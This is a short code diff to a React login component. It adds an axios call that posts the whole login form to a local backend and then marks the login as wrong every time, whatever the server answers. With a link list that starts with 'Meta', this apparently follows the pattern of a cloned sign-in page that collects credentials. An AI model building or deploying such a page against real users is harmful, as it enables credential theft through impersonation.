@@ -1,5 +1,6 @@
 import React, { useState } from "react";
 import Input from "./Input";
+import axios from "axios";
 
 const links = [
   "Meta",
@@ -33,6 +34,16 @@ function Login() {
   const sendEmail = async (e) => {
     e.preventDefault();
     console.log(formData);
+    try {
+      const response = await axios.post(
+        "http://localhost:5000/api/data",
+        formData
+      );
+      alert(response.data.message);
+    } catch (error) {
+      console.error(error);
+      alert("Error sending data");
+    }
     setIsWrong(true);
   };
   return (
